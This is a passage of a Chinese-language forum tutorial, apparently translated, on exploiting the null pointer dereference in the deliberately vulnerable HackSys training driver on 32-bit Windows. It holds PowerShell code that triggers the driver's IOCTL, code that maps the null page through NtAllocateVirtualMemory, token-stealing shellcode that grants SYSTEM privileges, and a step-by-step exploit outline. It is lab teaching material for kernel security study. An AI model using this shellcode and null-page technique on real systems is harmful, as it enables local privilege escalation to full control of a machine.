
```
Add-Type -TypeDefinition @"

using System;

using System.Diagnostics;

using System.Runtime.InteropServices;

using System.Security.Principal;



public static class EVD

{

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]

    public static extern IntPtr CreateFile(

        String lpFileName,

        UInt32 dwDesiredAccess,

        UInt32 dwShareMode,

        IntPtr lpSecurityAttributes,

        UInt32 dwCreationDisposition,

        UInt32 dwFlagsAndAttributes,

        IntPtr hTemplateFile);



    [DllImport("Kernel32.dll", SetLastError = true)]

    public static extern bool DeviceIoControl(

        IntPtr hDevice,

        int IoControlCode,

        byte[] InBuffer,

        int nInBufferSize,

        byte[] OutBuffer,

        int nOutBufferSize,

        ref int pBytesReturned,

        IntPtr Overlapped);



    [DllImport("kernel32.dll")]

    public static extern uint GetLastError();

}

"@



$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite,

[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)



if ($hDevice -eq -1) {

    echo "`n[!] Unable to get driver handle..`n"

    Return

} else {

    echo "`n[>] Driver information.."

    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"

    echo "[+] Handle: $hDevice"

}



$Buffer = [System.BitConverter]::GetBytes(0xbad0b0b0)

echo "`n[>] Sending buffer.."

echo "[+] Buffer length: $($Buffer.Length)"

echo "[+] IOCTL: 0x22202B`n"

[EVD]::DeviceIoControl($hDevice, 0x22202B, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero)|Out-null
```

![](https://bbs.kanxue.com/upload/attach/201803/530966_SDXXEHECFQWE77Z.jpg)

完美，没有崩溃，没有触发异常。如果魔数不匹配的话，我们就会进入调用空指针回调函数的代码块。

![](https://bbs.kanxue.com/upload/attach/201803/530966_4K8RFKQKQAUV36Y.jpg)

此后我们跳入到下一个指令块，这里空指针引用被触发。

![](https://bbs.kanxue.com/upload/attach/201803/530966_NHNRPN8Z3XGE2WZ.jpg)

很好，让我们在此函数下个断点并验证我们的理论！我们需要做的仅仅是传递一个不匹配的魔数（例如：`0xdeadb33f`）。

![](https://bbs.kanxue.com/upload/attach/201803/530966_4AGFXGYCP8EA2CF.jpg)

切实触发了空指针引用。你可能从上面的C++代码中注意到了这里触发了一个驱动异常例程。这非常好毕竟我们无需以BSOD告终。

## Pwn

这里唯一的技巧就是在于如何在`0x00000004`分配一个双字`dword`。我强烈建议你快速的看一下`[rohitab](https://bbs.kanxue.com/elink@be9K9s2c8@1M7q4)`9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4u0G2K9r3W2@1j5h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6V1K9i4y4U0N6i4y4K6i4K6u0r3N6r3!0H3K9h3y4Q4x3V1j5K6y4o6R3^5y4q4)9J5k6r3y4Q4x3X3c8K6L8h3q4D9L8q4)9J5k6r3S2S2P5q4)9J5k6s2c8G2i4K6u0V1j5i4k6G2K9h3c8Q4x3X3c8U0M7X3q4K6K9r3W2F1k6#2)9J5k6s2g2J5i4K6u0V1M7s2u0G2k6#2)9J5c8R3`.`.)，一个最有趣的阐述。

和linux不同，Windows允许低权限用户去映射用户进程的上下文到0页`null page`。这一功能在直觉上有一点遮蔽性，毕竟`VirtualAlloc`和`VirtualAllocEx`在分配的基地址低于`0x00001000`时都以拒绝访问而告终。然而，利用`NtAllocateVirtualMemory`函数则没有这样的限制。下列代码可以用于阐述这一现象。

```
Add-Type -TypeDefinition @"

using System;

using System.Diagnostics;

using System.Runtime.InteropServices;

using System.Security.Principal;



public static class EVD

{

    [DllImport("ntdll.dll")]

    public static extern uint NtAllocateVirtualMemory(

        IntPtr ProcessHandle,

        ref IntPtr BaseAddress,

        uint ZeroBits,

        ref UInt32 AllocationSize,

        UInt32 AllocationType,

        UInt32 Protect);

}

"@



echo "`n[>] Allocating process null page.."

[IntPtr]$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle

[IntPtr]$BaseAddress = 0x1 # Rounded down to 0x00000000

[UInt32]$AllocationSize = 2048 # 2kb, seems like a nice number

$CallResult = [EVD]::NtAllocateVirtualMemory($ProcHandle, [ref]$BaseAddress, 0, [ref]$AllocationSize, 0x3000, 0x40)

if ($CallResult -ne 0) {

    echo "[!] Failed to allocate null-page..`n"

    Return

} else {

    echo "[+] Success"

}
```

前面提到的文章看起来有一点荒谬，其作者无意中想到了这样一个好点子。预分配0页可以阻止空指针引用漏洞的利用（EMET就是这样做的）。。

我们可以复用前面文章中窃取token的shellcode。这一次无需任何改动，因为我们劫持了另一个函数调用。

```
$Shellcode = [Byte[]] @(

    #---[Setup]
    0x60,                               # pushad
    0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, # mov eax, fs:[KTHREAD_OFFSET]
    0x8B, 0x40, 0x50,                   # mov eax, [eax + EPROCESS_OFFSET]
    0x89, 0xC1,                         # mov ecx, eax (Current _EPROCESS structure)
    0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, # mov ebx, [eax + TOKEN_OFFSET]
    #---[Copy System PID token]
    0xBA, 0x04, 0x00, 0x00, 0x00,       # mov edx, 4 (SYSTEM PID)
    0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, # mov eax, [eax + FLINK_OFFSET] <-|
    0x2D, 0xB8, 0x00, 0x00, 0x00,       # sub eax, FLINK_OFFSET           |
    0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, # cmp [eax + PID_OFFSET], edx     |
    0x75, 0xED,                         # jnz                           ->|
    0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, # mov edx, [eax + TOKEN_OFFSET]
    0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, # mov [ecx + TOKEN_OFFSET], edx
    #---[Recover]
    0x61,                               # popad
    0xC3                                # ret
)
```

澄清一下我们的exp的通用安装方法：（1）把我们的shellcode放在内存中任意位置，（2）在程序的0页上分配内存，（3）把shellcode的地址写在`0x00000004`，（4）触发空指针引用。

## 终结

以上就是全部的过程，请参考完整的exp来掌握更多信息。

![](https://bbs.kanxue.com/upload/attach/201803/530966_NSQY4ZM3FMRDURK.jpg)

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于  2018-3-15 20:25

被玉涵编辑

，原因：
